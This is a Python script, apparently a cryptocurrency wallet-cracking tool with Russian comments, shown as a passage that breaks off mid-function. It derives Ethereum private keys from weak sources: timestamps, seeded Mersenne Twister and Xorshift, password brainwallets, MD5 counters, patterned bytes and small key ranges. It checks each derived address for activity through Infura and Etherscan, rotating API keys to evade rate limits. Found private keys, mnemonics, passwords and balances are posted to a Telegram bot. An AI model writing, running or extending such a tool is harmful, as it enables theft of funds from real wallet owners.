import asyncio
import datetime
import json
import os
import random
import threading
import logging
import keyboard
import aiohttp
import aiofiles
import re
import configparser
import pyfiglet
import hashlib
import tqdm
from colorama import Fore, Style
from termcolor import colored
from web3 import Web3
from web3.exceptions import Web3Exception
from mnemonic import Mnemonic

# Настройка логирования с BOM для Windows
logging.basicConfig(
    filename='eth_generator.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    encoding='utf-8',
    filemode='a'
)
logger = logging.getLogger(__name__)

# Добавляем BOM в начало файла
if not os.path.exists('eth_generator.log'):
    with open('eth_generator.log', 'wb') as f:
        f.write(b'\xEF\xBB\xBF')  # UTF-8 BOM

# Задержки для API
API_REQUEST_INTERVAL = 0.05
MAX_API_TIMEOUT = 60
DAILY_LIMIT_TIMEOUT = 86400
MIN_RETRY_AFTER = 3600
MAX_RETRIES = 3
RETRY_BACKOFF = 2
PAUSE_COUNT_LIMIT = 3
PAUSE_WINDOW = 3600

# Чтение конфигурации
def load_config():
    if not os.path.exists('API.ini'):
        print(Fore.RED + "Ошибка: файл API.ini не найден." + Style.RESET_ALL)
        logger.error("Файл API.ini не найден.")
        exit(1)
    config = configparser.ConfigParser()
    config.read('API.ini')
    if 'API' not in config:
        print(Fore.RED + "Ошибка: некорректный формат файла API.ini." + Style.RESET_ALL)
        logger.error("Некорректный формат файла API.ini.")
        exit(1)
    
    infura_urls = [url.strip() for url in config['API'].get('INFURA_URL', '').split(',') if url.strip()]
    etherscan_keys = [key.strip() for key in config['API'].get('ETHERSCAN_API_KEY', '').split(',') if key.strip()]
    telegram_token = config['API'].get('TELEGRAM_BOT_TOKEN', '')
    telegram_chat_id = config['API'].get('TELEGRAM_CHAT_ID', '')
    
    for url in infura_urls:
        if not url.startswith('https://'):
            print(Fore.RED + f"Ошибка: INFURA_URL '{url}' должен начинаться с https://" + Style.RESET_ALL)
            logger.error(f"Некорректный INFURA_URL: {url}")
            exit(1)
    if not infura_urls or not etherscan_keys:
        print(Fore.RED + "Ошибка: INFURA_URL или ETHERSCAN_API_KEY отсутствуют в API.ini." + Style.RESET_ALL)
        logger.error("INFURA_URL или ETHERSCAN_API_KEY отсутствуют в API.ini.")
        exit(1)
    
    return infura_urls, etherscan_keys, telegram_token, telegram_chat_id

# Инициализация API_STATES и API_ORDER
def initialize_api_states():
    global API_STATES, API_ORDER
    API_STATES.clear()
    API_ORDER.clear()
    for api_type, keys in API_KEYS.items():
        for idx, key in enumerate(keys):
            key_id = f"{api_type}_{idx}"
            API_STATES[key_id] = {
                'type': api_type,
                'key': key,
                'active': True,
                'limit_reached_time': None,
                'temp_pauses': [],
                'index': idx
            }
            API_ORDER.append(key_id)
    logger.info(f"Инициализировано {len(API_STATES)} API ключей: {list(API_STATES.keys())}")

# Загрузка конфигурации и инициализация
INFURA_URLS, ETHERSCAN_API_KEYS, TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID = load_config()
API_STATES = {}
API_KEYS = {
    'infura': INFURA_URLS,
    'etherscan': ETHERSCAN_API_KEYS
}
API_ORDER = []
initialize_api_states()

# Глобальные переменные
API_STATES = {}  # Хранит состояние для каждого ключа
API_KEYS = {
    'infura': INFURA_URLS,
    'etherscan': ETHERSCAN_API_KEYS
}
API_ORDER = []  # Будет заполнен при инициализации

# Инициализация API
initialize_api_states()
web3 = None
connected = False
for url in INFURA_URLS:
    try:
        web3 = Web3(Web3.HTTPProvider(url))
        if web3.is_connected():
            logger.info(f"Успешно подключено к Infura: {url}")
            print(Fore.GREEN + f"Подключено к Infura: {url}" + Style.RESET_ALL)
            connected = True
            break
        else:
            logger.warning(f"Не удалось подключиться к Infura URL: {url}")
            print(Fore.YELLOW + f"Не удалось подключиться к Infura URL: {url}" + Style.RESET_ALL)
    except Exception as e:
        logger.error(f"Ошибка при подключении к Infura URL {url}: {e}")
        print(Fore.RED + f"Ошибка при подключении к Infura URL {url}: {e}" + Style.RESET_ALL)
if not connected:
    print(Fore.RED + "Ошибка: не удалось подключиться к любому Infura URL. Проверьте INFURA_URL в API.ini." + Style.RESET_ALL)
    logger.error("Не удалось подключиться к любому Infura URL.")
    exit(1)
    
# Управление паузой и уникальностью ключей
pause_event = asyncio.Event()  # Событие для управления паузой
used_keys = set()  # Множество для хранения уникальных ключей
used_keys_lock = asyncio.Lock()  # Блокировка для безопасного доступа к used_keys
last_timestamp = int(datetime.datetime.now().timestamp())  # Начальная временная метка

# Установка начального состояния pause_event
pause_event.set()  # Код начинает работу без паузы
logger.info("Инициализированы глобальные переменные: pause_event, used_keys, used_keys_lock, last_timestamp")

# ASCII-арт
ascii_art = pyfiglet.figlet_format("ETH keys generator", font="standard")
colored_art = colored(ascii_art, 'cyan')
print(colored_art)
print(Fore.CYAN + "")
print()

# Константы
SUCCESS_FILE = 'successful_wallets.txt'
BALANCE_FILE = 'successful_wallets_balance.txt'
BAD_FILE = 'bad_wallets.txt'
STATE_FILE = 'state.json'
STATS_FILE = 'eth_generator.log'

GROUP_RANGES = {
    'A': (0x0000000000000000000000000000000000000000000000000000000000000001, 0x00000000000000000000000000000000000000000000000000000000FFFFFFFF),
    'B': (0x0000000000000000000000000000000000000000000000000000000100000000, 0x000000000000000000000000000000000000000000000000FFFFFFFF00000000),
    'C': (0x0000000000000000000000000000000000000000000000010000000000000000, 0x0000000000000000000000000000000000000000FFFFFFFF0000000000000000),
    'D': (0x0000000000000000000000000000000000000001000000000000000000000000, 0x00000000000000000000000000000000FFFFFFFF000000000000000000000000),
    'E': (0x0000000000000000000000000000000100000000000000000000000000000000, 0x000000000000000000000000FFFFFFFF00000000000000000000000000000000),
    'F': (0x0000000000000000000000010000000000000000000000000000000000000000, 0x0000000000000000FFFFFFFF0000000000000000000000000000000000000000),
    'G': (0x0000000000000001000000000000000000000000000000000000000000000000, 0x00000000FFFFFFFF000000000000000000000000000000000000000000000000),
    'H': (0x0000000100000000000000000000000000000000000000000000000000000000, 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000),
}

# Статистика
stats = {
    'keys_generated': 0,
    'matches_file': 0,
    'matches_api': 0,
    'addresses_with_balance': 0,
    'start_time': datetime.datetime.now(),
    'group_stats': {group: {'keys': 0, 'matches_file': 0, 'matches_api': 0} for group in GROUP_RANGES}
}

# Отправка сообщения в Telegram
async def send_telegram_message(message, session, method=None, address=None, private_key=None, mnemonic_phrase=None, balance=None):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        logger.warning("Telegram токен или chat_id не указаны. Пропуск отправки.")
        return
    method_names = {
        1: "Стандартная генерация",
        2: "Vanity-адреса",
        3: "Генерация по группам",
        4: "Мнемонические фразы",
        5: "Уязвимые ключи",
        6: "Ключи по времени",
        7: "Mersenne Twister",
        8: "Конкатенация",
        9: "Ключи из паролей",
        10: "MD5 хэши",
        11: "Xorshift",
        12: "Усечённые числа"
    }
    formatted_message = f"**Найден кошелёк!** 🔔\n"
    formatted_message += f"- **Метод**: {method_names.get(method, 'Неизвестный')}\n"
    formatted_message += f"- **Адрес**: `{address}`\n"
    formatted_message += f"- **Приватный ключ**: `{private_key}`\n"
    if mnemonic_phrase and method != 9:
        formatted_message += f"- **Мнемоническая фраза**: `{mnemonic_phrase}`\n"
    elif mnemonic_phrase and method == 9:
        formatted_message += f"- **Пароль**: `{mnemonic_phrase}`\n"
    if balance is not None:
        formatted_message += f"- **Баланс**: {balance} ETH\n"
    formatted_message += f"- **Время**: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    formatted_message += f"\n{message}"
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": formatted_message,
        "parse_mode": "Markdown"
    }
    try:
        async with session.post(url, json=payload, timeout=10) as resp:
            response_text = await resp.text()
            logger.debug(f"Telegram API ответ: код {resp.status}, {response_text}")
            if resp.status == 200:
                logger.info("Сообщение успешно отправлено в Telegram")
            else:
                logger.error(f"Ошибка Telegram API: код {resp.status}, ответ: {response_text}")
                print(Fore.YELLOW + f"Ошибка отправки в Telegram: код {resp.status}" + Style.RESET_ALL)
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        logger.error(f"Сетевая ошибка при отправке в Telegram: {e}")
        print(Fore.YELLOW + f"Сетевая ошибка Telegram API: {e}" + Style.RESET_ALL)

# Управление паузой
def toggle_pause():
    if pause_event.is_set():
        pause_event.clear()
        print(Fore.CYAN + "Код приостановлен." + Style.RESET_ALL)
        logger.info("Код приостановлен.")
    else:
        pause_event.set()
        print(Fore.CYAN + "Код продолжен." + Style.RESET_ALL)
        logger.info("Код продолжен.")

def listen_for_pause():
    keyboard.add_hotkey('page down', toggle_pause)
    keyboard.add_hotkey('page up', toggle_pause)

# Работа с состоянием
def load_state():
    if os.path.exists(STATE_FILE):
        try:
            with open(STATE_FILE, 'r', encoding='utf-8') as f:
                state = json.load(f)
                start_index = state.get('start_index', 0)
                last_password_index = state.get('last_password_index', 0)
                logger.info(f"Загружено состояние: start_index={start_index}, last_password_index={last_password_index}")
                return {'start_index': start_index, 'last_password_index': last_password_index}
        except Exception as e:
            logger.error(f"Ошибка при чтении state.json: {e}")
    logger.info("Файл состояния не найден, используется начальное состояние.")
    return {'start_index': 0, 'last_password_index': 0}

def save_state(start_index, last_password_index=0):
    state = {
        'start_index': start_index,
        'last_password_index': last_password_index
    }
    try:
        with open(STATE_FILE, 'w', encoding='utf-8') as f:
            json.dump(state, f)
        logger.info(f"Сохранено состояние: start_index={start_index}, last_password_index={last_password_index}")
    except Exception as e:
        logger.error(f"Ошибка при сохранении state.json: {e}")

# Сохранение статистики
async def save_stats(method, check_mode, group=None):
    # Циклическое логирование для stats.txt
    if os.path.exists(STATS_FILE) and os.path.getsize(STATS_FILE) > 100 * 1024 * 1024:
        async with aiofiles.open(STATS_FILE, 'r', encoding='utf-8') as f:
            lines = await f.readlines()
        keep_lines = lines[int(len(lines) * 0.5):]  # Сохраняем последние 50% строк
        async with aiofiles.open(STATS_FILE, 'w', encoding='utf-8') as f:
            await f.writelines(keep_lines)
        logger.info(f"Файл {STATS_FILE} обрезан циклически (удалены старые записи)")
        print(Fore.YELLOW + f"Файл {STATS_FILE} обрезан: удалены старые записи." + Style.RESET_ALL)
    
    elapsed_time = (datetime.datetime.now() - stats['start_time']).total_seconds()
    async with aiofiles.open(STATS_FILE, 'a', encoding='utf-8') as f:
        await f.write(f"Method: {method}, Mode: {check_mode}\n")
        await f.write(f"Keys generated: {stats['keys_generated']}\n")
        await f.write(f"Matches (file): {stats['matches_file']}\n")
        await f.write(f"Matches (API): {stats['matches_api']}\n")
        await f.write(f"Addresses with balance: {stats['addresses_with_balance']}\n")
        await f.write(f"Total time: {int(elapsed_time // 3600):02d}:{int((elapsed_time % 3600) // 60):02d}:{int(elapsed_time % 60):02d}\n")
        if method == 3 and group:
            group_data = stats['group_stats'][group]
            await f.write(f"Group {group}: Keys: {group_data['keys']}, Matches (file): {group_data['matches_file']}, Matches (API): {group_data['matches_api']}\n")
        await f.write("\n")
    logger.info(f"Статистика сохранена в {STATS_FILE}")

# Проверка интернета
async def check_internet(session):
    try:
        async with session.get('https://etherscan.io/', timeout=20) as response:
            return response.status == 200
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False

# Утилита для расчёта времени до полуночи UTC
def time_until_midnight_utc():
    now = datetime.datetime.now(datetime.timezone.utc)
    midnight = now.replace(hour=0, minute=0, second=0, microsecond=0) + datetime.timedelta(days=1)
    seconds_until_midnight = (midnight - now).total_seconds()
    return max(seconds_until_midnight, 1)

# Ожидание сброса лимитов
async def wait_for_api_reset():
    now = datetime.datetime.now()
    reset_times = []
    for key_id, state in API_STATES.items():
        if state['limit_reached_time']:
            reset_times.append(state['limit_reached_time'])
        else:
            reset_times.append(now)
    if not reset_times:
        reset_times.append(now + datetime.timedelta(seconds=MAX_API_TIMEOUT))
    next_reset = min(reset_times)
    wait_time = max((next_reset - now).total_seconds(), 1)
    logger.debug(f"Ожидание {wait_time} секунд до ближайшего сброса API.")
    print(Fore.YELLOW + f"Все API ключи временно недоступны. Ожидание {wait_time:.1f} секунд до {next_reset.strftime('%H:%M:%S')}..." + Style.RESET_ALL)
    await asyncio.sleep(wait_time)
    for key_id, state in API_STATES.items():
        if state['limit_reached_time'] and now >= state['limit_reached_time']:
            state['active'] = True
            state['limit_reached_time'] = None
            state['temp_pauses'] = []
            logger.info(f"Сброс лимита для ключа {key_id}.")

# Проверка доступности ключа
def can_use_api(key_id):
    state = API_STATES[key_id]
    now = datetime.datetime.now()
    if state['limit_reached_time'] and now >= state['limit_reached_time']:
        state['active'] = True
        state['limit_reached_time'] = None
        state['temp_pauses'] = []
        logger.info(f"Ключ {key_id} восстановлен после истечения limit_reached_time.")
    logger.debug(f"Ключ {key_id} активен: {state['active']}, время сброса: {state['limit_reached_time']}")
    return state['active']

# Проверка временных пауз
def check_temp_pauses(key_id):
    state = API_STATES[key_id]
    now = datetime.datetime.now()
    state['temp_pauses'] = [t for t in state['temp_pauses'] if (now - t).total_seconds() <= PAUSE_WINDOW]
    logger.debug(f"Ключ {key_id}: {len(state['temp_pauses'])} активных пауз")
    if len(state['temp_pauses']) >= PAUSE_COUNT_LIMIT:
        wait_time = time_until_midnight_utc()
        state['active'] = False
        state['limit_reached_time'] = now + datetime.timedelta(seconds=wait_time)
        state['temp_pauses'] = []
        print(Fore.YELLOW + f"Ключ {key_id} получил {PAUSE_COUNT_LIMIT} паузы за час. Отключение до полуночи UTC..." + Style.RESET_ALL)
        logger.info(f"Ключ {key_id} отключён до полуночи UTC: {wait_time} секунд")
        return True
    return False

# Сравнение адреса с загруженными адресами
async def compare_address_with_file(address, addresses_set):
    if not addresses_set:
        logger.error("Множество addresses_set пустое.")
        print(Fore.RED + "Ошибка: множество адресов пустое." + Style.RESET_ALL)
        return False
    start_time = datetime.datetime.now()
    address_lower = address.lower()
    match = address_lower in addresses_set
    elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
    logger.debug(f"Проверка адреса {address} в памяти: {match}, {elapsed_time:.6f} сек")
    if match:
        print(Fore.GREEN + f"Совпадение найдено: {address}" + Style.RESET_ALL)
        logger.info(f"Совпадение найдено: {address}")
    return match

# Генерация ключей
def generate_private_key():
    private_key = Web3.keccak(os.urandom(32)).hex()
    logger.debug(f"Сгенерирован стандартный ключ: {private_key}")
    return private_key

def get_address_from_private_key(private_key):
    account = web3.eth.account.from_key(private_key)
    address = account.address
    logger.debug(f"Получен адрес {address} из ключа {private_key}")
    return address

def is_valid_eth_address(address):
    valid = Web3.is_address(address)
    logger.debug(f"Проверка адреса {address}: {'валидный' if valid else 'невалидный'}")
    return valid

def generate_mnemonic_key():
    logger.warning("Генерация мнемонической фразы со слабым RNG")
    a = 1664525
    c = 1013904223
    m = 2**32
    seed = int(datetime.datetime.now().timestamp()) % m
    random_bytes = bytearray()
    for _ in range(16):
        seed = (a * seed + c) % m
        random_bytes.append(seed & 0xFF)
    entropy = bytes(random_bytes)
    mnemo = Mnemonic("english")
    mnemonic_phrase = mnemo.to_mnemonic(entropy)
    seed = mnemo.to_seed(mnemonic_phrase)
    private_key = Web3.keccak(seed[:32]).hex()
    logger.debug(f"Сгенерирована мнемоническая фраза: {mnemonic_phrase}, ключ: {private_key}")
    return private_key, mnemonic_phrase

def generate_password_key(password=None):
    logger.warning("Генерация ключа на основе пароля")
    if not password:
        password = f"password{random.randint(1, 1000000)}"
    private_key = Web3.keccak(text=password).hex()
    logger.debug(f"Сгенерирован ключ из пароля '{password}': {private_key}")
    return private_key, password

def generate_vulnerable_combined_key(vulnerable_type):
    logger.warning("Генерация уязвимого ключа")
    if vulnerable_type == 1:
        patterns = [
            lambda: bytes([random.randint(0, 255)] * 32),
            lambda: (b'\xAA\xBB') * 16,
            lambda: (b'\x0F\xF0') * 16,
        ]
    elif vulnerable_type == 2:
        patterns = [
            lambda: b'\x00' * 28 + os.urandom(4),
            lambda: os.urandom(4) + b'\x00' * 28,
            lambda: b'\x00' * 12 + os.urandom(8) + b'\x00' * 12,
        ]
    elif vulnerable_type == 3:
        patterns = [
            lambda: bytes([i % 256 for i in range(32)]),
            lambda: bytes([random.choice([0x11, 0x22, 0x33, 0x44]) for _ in range(32)]),
            lambda: (b'\xDE\xAD\xBE\xEF') * 8,
        ]
    pattern = random.choice(patterns)()
    private_key = Web3.keccak(pattern).hex()
    logger.debug(f"Сгенерирован уязвимый ключ типа {vulnerable_type}: {private_key}")
    return private_key

def generate_timestamp_key():
    global last_timestamp
    logger.warning("Генерация ключа на основе времени")
    if last_timestamp <= 0:
        logger.error("last_timestamp стал отрицательным, сброс на текущую временную метку")
        last_timestamp = int(datetime.datetime.now().timestamp())
    timestamp_bytes = last_timestamp.to_bytes(32, byteorder='big')
    private_key = Web3.keccak(timestamp_bytes).hex()
    last_timestamp -= 1
    logger.debug(f"Сгенерирован ключ для времени {last_timestamp}: {private_key}")
    return private_key

def generate_mersenne_key():
    logger.warning("Генерация ключа из Mersenne Twister")
    random.seed(int(datetime.datetime.now().timestamp()))
    random_bytes = bytes([random.getrandbits(8) for _ in range(32)])
    private_key = Web3.keccak(random_bytes).hex()
    logger.debug(f"Сгенерирован ключ из Mersenne Twister: {private_key}")
    return private_key

def generate_concatenated_key():
    logger.warning("Генерация ключа из конкатенации слабых источников")
    timestamp = int(datetime.datetime.now().timestamp()).to_bytes(8, 'big')
    pid = os.getpid().to_bytes(4, 'big')
    random_part = os.urandom(8)
    constant = b'\xAB\xCD' * 6
    combined = timestamp + pid + random_part + constant
    private_key = Web3.keccak(combined).hex()
    logger.debug(f"Сгенерирован ключ из конкатенации: {private_key}")
    return private_key

def generate_md5_based_key():
    logger.warning("Генерация ключа на основе MD5")
    counter = random.randint(0, 2**32 - 1)
    input_data = str(counter).encode()
    md5_hash = hashlib.md5(input_data).digest()
    combined = md5_hash + md5_hash
    private_key = Web3.keccak(combined).hex()
    logger.debug(f"Сгенерирован ключ через MD5 для {counter}: {private_key}")
    return private_key

def generate_xorshift_key():
    logger.warning("Генерация ключа из Xorshift")
    seed = int(datetime.datetime.now().timestamp()) & 0xFFFFFFFF
    state0 = seed
    state1 = seed ^ 0xDEADBEEF
    random_bytes = bytearray()
    for _ in range(32):
        t = state0
        s = state1
        state0 = s
        t ^= (t << 23) & 0xFFFFFFFFFFFFFFFF
        t ^= (t >> 17)
        t ^= s ^ (s >> 26)
        state1 = t
        random_bytes.append((t + s) & 0xFF)
    private_key = Web3.keccak(bytes(random_bytes)).hex()
    logger.debug(f"Сгенерирован ключ из Xorshift: {private_key}")
    return private_key

def generate_truncated_key():
    logger.warning("Генерация ключа из усечённых больших чисел")
    large_number = os.urandom(64)
    truncated = large_number[:32]
    private_key = Web3.keccak(truncated).hex()
    logger.debug(f"Сгенерирован ключ из усечённого числа: {private_key}")
    return private_key

def generate_vanity_address(prefix=None, suffix=None):
    while True:
        private_key = generate_private_key()
        address = get_address_from_private_key(private_key)
        address_lower = address.lower()
        if prefix and suffix:
            if address_lower.startswith(prefix.lower()) and address_lower.endswith(suffix.lower()):
                logger.debug(f"Сгенерирован vanity-адрес {address}")
                return private_key, address
        elif prefix:
            if address_lower.startswith(prefix.lower()):
                logger.debug(f"Сгенерирован vanity-адрес {address}")
                return private_key, address
        elif suffix:
            if address_lower.endswith(suffix.lower()):
                logger.debug(f"Сгенерирован vanity-адрес {address}")
                return private_key, address

def generate_private_key_in_group(group):
    start_range, end_range = GROUP_RANGES[group]
    private_key_int = random.randint(start_range, end_range)
    private_key_bytes = private_key_int.to_bytes(32, byteorder='big')
    private_key = Web3.keccak(private_key_bytes).hex()
    logger.debug(f"Сгенерирован ключ в группе {group}: {private_key}")
    return private_key

# Генерация мнемонической фразы из пароля
def generate_mnemonic_from_password(password):
    logger.warning("Генерация мнемонической фразы из пароля")
    # Хэшируем пароль через Keccak-256 для создания 16 байт энтропии
    entropy = Web3.keccak(text=password)[:16]  # Берем первые 16 байт
    mnemo = Mnemonic("english")
    mnemonic_phrase = mnemo.to_mnemonic(entropy)
    seed = mnemo.to_seed(mnemonic_phrase)
    private_key = Web3.keccak(seed[:32]).hex()
    logger.debug(f"Сгенерирована мнемоническая фраза из пароля '{password}': {mnemonic_phrase}, ключ: {private_key}")
    return private_key, mnemonic_phrase

# Генерация ключей по выбранному методу
async def generate_private_key_by_method(method, used_keys, used_keys_lock, vulnerable_type=None, password=None, timestamp=None):
    mnemonic_phrase = None
    async with used_keys_lock:
        if method == 1:
            private_key = generate_private_key()
        elif method == 2:
            return None, None
        elif method == 3:
            return None, None
        elif method == 4:
            if password:
                private_key, mnemonic_phrase = generate_mnemonic_from_password(password)
            else:
                private_key, mnemonic_phrase = generate_mnemonic_key()  # Fallback на старый метод
        elif method == 5:
            private_key = generate_vulnerable_combined_key(vulnerable_type)
        elif method == 6:
            private_key = generate_timestamp_key()
        elif method == 7:
            private_key = generate_mersenne_key()
        elif method == 8:
            private_key = generate_concatenated_key()
        elif method == 9:
            private_key, mnemonic_phrase = generate_password_key(password)
        elif method == 10:
            private_key = generate_md5_based_key()
        elif method == 11:
            private_key = generate_xorshift_key()
        elif method == 12:
            private_key = generate_truncated_key()
        else:
            logger.error(f"Неверный метод генерации: {method}")
            return None, None
        # Для методов 4 и 9 не проверяем уникальность, так как каждый пароль/слово должен генерировать ровно один ключ
        if method in [4, 9] and password:
            return private_key, mnemonic_phrase
        # Для остальных методов проверяем уникальность
        if private_key and private_key not in used_keys:
            used_keys.add(private_key)
            logger.debug(f"Уникальный ключ {private_key} добавлен")
            return private_key, mnemonic_phrase
        logger.warning(f"Повторный ключ {private_key}")
        return None, None

# Проверка транзакций
async def check_transactions(address, session):
    logger.debug(f"Начало проверки транзакций для адреса: {address}")
    
    if not await check_internet(session):
        print(Fore.RED + "Нет подключения к интернету." + Style.RESET_ALL)
        logger.error(f"Нет интернет-соединения для адреса: {address}")
        return False

    available_keys = [key_id for key_id in API_ORDER if can_use_api(key_id)]
    logger.debug(f"Доступные ключи: {available_keys}")
    if not available_keys:
        await wait_for_api_reset()
        available_keys = [key_id for key_id in API_ORDER if can_use_api(key_id)]
        logger.debug(f"Доступные ключи после ожидания: {available_keys}")
        if not available_keys:
            logger.error("Все API ключи недоступны после ожидания.")
            print(Fore.RED + "Все API ключи недоступны." + Style.RESET_ALL)
            return False

    for key_id in available_keys:
        api_type = API_STATES[key_id]['type']
        print(Fore.CYAN + f"Проверка через ключ {key_id}: {address}" + Style.RESET_ALL)
        start_time = datetime.datetime.now()
        result = None
        for attempt in range(MAX_RETRIES):
            try:
                if api_type == 'infura':
                    result = await check_transactions_infura(address, session, key_id)
                elif api_type == 'etherscan':
                    result = await check_transactions_etherscan(address, session, key_id)
                break
            except (aiohttp.ClientError, asyncio.TimeoutError, Web3Exception) as e:
                logger.warning(f"Попытка {attempt + 1}/{MAX_RETRIES} для ключа {key_id}: {e}")
                if attempt < MAX_RETRIES - 1:
                    delay = RETRY_BACKOFF ** attempt
                    logger.debug(f"Ожидание {delay} секунд.")
                    await asyncio.sleep(delay)
                else:
                    logger.error(f"Все попытки для ключа {key_id} провалились: {e}")
                    result = None
        
        if result is not None:
            logger.info(f"Ключ {key_id} вернул: {result} для {address}")
            elapsed_time = (datetime.datetime.now() - start_time).total_seconds()
            logger.debug(f"Запрос к ключу {key_id}: {elapsed_time:.2f} сек")
            await asyncio.sleep(API_REQUEST_INTERVAL)
            return result
        
        logger.warning(f"Ключ {key_id} не вернул результат.")

    logger.debug("Все ключи проверены, результатов нет.")
    return False

# Проверка транзакций через Infura
async def check_transactions_infura(address, session, key_id):
    state = API_STATES[key_id]
    infura_url = state['key']
    try:
        payload = {
            "jsonrpc": "2.0",
            "method": "eth_getTransactionCount",
            "params": [address, "latest"],
            "id": 1
        }
        headers = {"Content-Type": "application/json"}
        async with session.post(infura_url, json=payload, headers=headers, timeout=5) as resp:
            response_text = await resp.text()
            logger.debug(f"Infura ключ {key_id} код: {resp.status}, ответ: {response_text} для {address}")
            if resp.status == 200:
                try:
                    data = await resp.json()
                    if 'result' in data:
                        transactions = int(data['result'], 16)
                        logger.debug(f"Infura ключ {key_id}: {transactions} транзакций для {address}")
                        return transactions > 0
                    else:
                        logger.error(f"Infura ключ {key_id}: некорректный ответ: {data}")
                        return None
                except ValueError as e:
                    logger.error(f"Infura ключ {key_id}: некорректный JSON: {e}, ответ: {response_text}")
                    return None
            elif resp.status in (429, 401):
                try:
                    data = await resp.json()
                    error_msg = data.get('error', {}).get('message', 'Rate limit exceeded').lower()
                except ValueError:
                    error_msg = 'Rate limit exceeded'
                retry_after = resp.headers.get('Retry-After', None)
                logger.warning(f"Лимит или ошибка авторизации Infura ключ {key_id}: '{error_msg}', Retry-After: {retry_after}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                if any(keyword in error_msg for keyword in ['daily', 'limit reached', 'rate limit', 'exceeded']):
                    wait_time = time_until_midnight_utc()
                    state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                    print(Fore.YELLOW + f"Дневной лимит Infura ключа {key_id} ('{error_msg}'). Отключение до полуночи UTC." + Style.RESET_ALL)
                    logger.debug(f"Infura ключ {key_id}: отключён до полуночи UTC: {wait_time} сек")
                else:
                    state['temp_pauses'].append(datetime.datetime.now())
                    if check_temp_pauses(key_id):
                        return None
                    if retry_after:
                        try:
                            retry_after = int(retry_after)
                            retry_after = max(retry_after, MIN_RETRY_AFTER)
                            state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                            logger.debug(f"Infura ключ {key_id} Retry-After: {retry_after} сек")
                        except ValueError:
                            state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                            logger.debug(f"Infura ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                    else:
                        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                        logger.debug(f"Infura ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                    print(Fore.YELLOW + f"Временный лимит Infura ключа {key_id} ('{error_msg}')." + Style.RESET_ALL)
                return None
            else:
                print(Fore.YELLOW + f"Ошибка Infura ключа {key_id} (код: {resp.status})." + Style.RESET_ALL)
                logger.warning(f"Ошибка Infura ключа {key_id}: код {resp.status}, ответ: {response_text}")
                state['active'] = False
                state['limit_reached_time'] = datetime.datetime.now()
                state['temp_pauses'].append(datetime.datetime.now())
                if check_temp_pauses(key_id):
                    return None
                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                logger.debug(f"Infura ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                return None
    except (aiohttp.ClientError, asyncio.TimeoutError, Web3Exception) as e:
        print(Fore.YELLOW + f"Сетевая ошибка Infura ключа {key_id}: {e}." + Style.RESET_ALL)
        logger.error(f"Сетевая ошибка Infura ключа {key_id}: {e}")
        state['active'] = False
        state['limit_reached_time'] = datetime.datetime.now()
        state['temp_pauses'].append(datetime.datetime.now())
        if check_temp_pauses(key_id):
            return None
        state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
        logger.debug(f"Infura ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
        return None

# Проверка транзакций через Etherscan
async def check_transactions_etherscan(address, session, key_id):
    state = API_STATES[key_id]
    api_key = state['key']
    try:
        url = f'https://api.etherscan.io/api?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&sort=asc&apikey={api_key}'
        async with session.get(url, timeout=5) as resp:
            response_text = await resp.text()
            logger.debug(f"Etherscan ключ {key_id} код: {resp.status}, ответ: {response_text} для {address}")
            if resp.status == 200:
                try:
                    data = await resp.json()
                    if data['status'] == '1':
                        transactions = data['result']
                        logger.debug(f"Etherscan ключ {key_id}: {len(transactions)} транзакций для {address}")
                        return len(transactions) > 0
                    elif data['status'] == '0' and data['message'] == 'No transactions found':
                        logger.debug(f"Etherscan ключ {key_id}: нет транзакций для {address}")
                        return False
                    else:
                        error_msg = data.get('message', 'Нет сообщения').lower()
                        retry_after = resp.headers.get('Retry-After', None)
                        logger.warning(f"Ошибка Etherscan ключа {key_id}: '{error_msg}', Retry-After: {retry_after}")
                        state['active'] = False
                        state['limit_reached_time'] = datetime.datetime.now()
                        if any(keyword in error_msg for keyword in ['max rate limit', 'exceeded', 'rate limit', 'notok']):
                            wait_time = time_until_midnight_utc()
                            state['limit_reached_time'] += datetime.timedelta(seconds=wait_time)
                            print(Fore.YELLOW + f"Дневной лимит Etherscan ключа {key_id} ('{error_msg}'). Отключение до полуночи UTC." + Style.RESET_ALL)
                            logger.debug(f"Etherscan ключ {key_id}: отключён до полуночи UTC: {wait_time} сек")
                        else:
                            state['temp_pauses'].append(datetime.datetime.now())
                            if check_temp_pauses(key_id):
                                return None
                            if retry_after:
                                try:
                                    retry_after = int(retry_after)
                                    retry_after = max(retry_after, MIN_RETRY_AFTER)
                                    state['limit_reached_time'] += datetime.timedelta(seconds=retry_after)
                                    logger.debug(f"Etherscan ключ {key_id} Retry-After: {retry_after} сек")
                                except ValueError:
                                    state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                    logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                            else:
                                state['limit_reached_time'] += datetime.timedelta(seconds=MAX_API_TIMEOUT)
                                logger.debug(f"Etherscan ключ {key_id}: пауза на {MAX_API_TIMEOUT} сек")
                            print(Fore.YELLOW + f"Временная ошибка Etherscan ключа {key_id} ('{error_msg}')." + Style.RESET_ALL)
                        return None
                except ValueError as e:
                    logger.error(f"Etherscan ключ {key_id}: некорректный JSON: {e}, ответ: {response_text}")
                    return None
            elif resp.status in (429, 401):
                try:
